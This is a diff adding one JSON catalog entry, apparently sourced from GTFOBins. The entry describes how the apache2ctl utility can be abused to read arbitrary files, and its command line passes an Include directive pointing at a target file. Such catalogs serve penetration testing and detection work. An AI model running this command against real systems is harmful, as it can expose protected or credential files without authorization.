@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-apache2ctl-file-read",
+  "name": "GTFOBins · apache2ctl (file-read)",
+  "command": "apache2ctl -c 'Include /path/to/input-file'",
+  "description": "Use apache2ctl to file read via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "apache2ctl",
+    "file-read"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/apache2ctl/#file-read",
+  "upstream_id": "apache2ctl/file-read/0",
+  "category": "gtfobins",
+  "subcategory": "file-read",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/apache2ctl/"
+    }
+  ]
+}
